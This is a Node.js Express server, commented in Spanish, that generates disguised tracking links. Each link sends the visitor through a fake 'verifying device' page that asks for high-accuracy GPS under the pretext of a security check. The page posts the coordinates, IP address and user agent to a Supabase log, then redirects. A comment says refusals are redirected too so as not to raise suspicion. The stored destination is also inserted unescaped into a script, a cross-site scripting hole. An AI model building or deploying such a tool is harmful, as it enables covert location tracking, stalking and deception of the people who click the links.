require('dotenv').config();
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json());

// Permitir trust proxy para Render
app.set('trust proxy', true);

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.error('Error: Faltan las variables de Supabase.');
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

/**
 * 1. Endpoint para generar el enlace
 */
app.post('/api/generate-link', async (req, res) => {
  const { targetUrl } = req.body;

  try {
    const destination = targetUrl && targetUrl.trim() !== '' ? targetUrl.trim() : 'https://google.com';

    const { data, error } = await supabase
      .from('tracking_links')
      .insert([{ target_url: destination }])
      .select('id')
      .single();

    if (error) throw error;

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    const trackingLink = `${protocol}://${host}/r/${data.id}`;

    return res.status(201).json({
      success: true,
      tracking_id: data.id,
      link: trackingLink,
      target_url: destination
    });
  } catch (err) {
    console.error('Error generando link:', err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 2. Página intermedia que solicita el GPS del dispositivo de forma limpia
 */
app.get('/r/:id', async (req, res) => {
  const { id } = req.params;

  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');

  try {
    const { data: linkRecord, error } = await supabase
      .from('tracking_links')
      .select('target_url')
      .eq('id', id)
      .single();

    if (error || !linkRecord) {
      return res.redirect(302, 'https://google.com');
    }

    const destination = linkRecord.target_url;

    // Pantalla limpia y básica que fuerza/pide la ubicación para continuar
    const html = `
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Verificando dispositivo...</title>
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .box { text-align: center; padding: 2rem; max-width: 320px; width: 90%; }
          .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-left-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1.5rem auto; }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          h2 { font-size: 1.25rem; margin-bottom: 0.5rem; font-weight: 500; }
          p { color: #94a3b8; font-size: 0.875rem; margin: 0; }
        </style>
      </head>
      <body>
        <div class="box">
          <div class="spinner"></div>
          <h2>Cargando contenido...</h2>
          <p>Confirma el acceso de seguridad para continuar.</p>
        </div>

        <script>
          const trackingId = "${id}";
          const destination = "${destination}";

          function proceed(coords = null) {
            const payload = coords ? {
              status: 'granted',
              latitude: coords.latitude,
              longitude: coords.longitude,
              accuracy: coords.accuracy
            } : { status: 'denied' };

            fetch('/api/submit-gps', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ link_id: trackingId, ...payload }),
              keepalive: true
            }).catch(() => {}).finally(() => {
              window.location.href = destination;
            });
          }

          if ("geolocation" in navigator) {
            // Intentar obtener la posición exacta del hardware GPS
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                proceed(pos.coords);
              },
              (err) => {
                // Si rechaza o falla, redirige igual para no levantar sospechas
                proceed(null);
              },
              { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
            );
          } else {
            window.location.href = destination;
          }
        </script>
      </body>
      </html>
    `;

    return res.send(html);

  } catch (err) {
    console.error('Error en redirección:', err.message);
    return res.redirect(302, 'https://google.com');
  }
});

/**
 * 3. Recibe los datos y los guarda en Supabase
 */
app.post('/api/submit-gps', async (req, res) => {
  const { link_id, latitude, longitude, accuracy, status } = req.body;
  const userAgent = req.headers['user-agent'] || 'Desconocido';

  const forwarded = req.headers['x-forwarded-for'];
  let clientIp = req.headers['cf-connecting-ip'] || 
                 req.headers['x-real-ip'] || 
                 (forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress);

  if (clientIp && clientIp.includes('::ffff:')) {
    clientIp = clientIp.replace('::ffff:', '');
  }

  try {
    if (status === 'granted') {
      await supabase
        .from('tracking_logs')
        .insert([{
          link_id: link_id,
          ip_address: clientIp,
          latitude: latitude,
          longitude: longitude,
          user_agent: `${userAgent} [GPS Hardware ±${Math.round(accuracy || 0)}m]`
        }]);
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error guardando GPS:', err.message);
    return res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor activo en el puerto ${PORT}`);
});
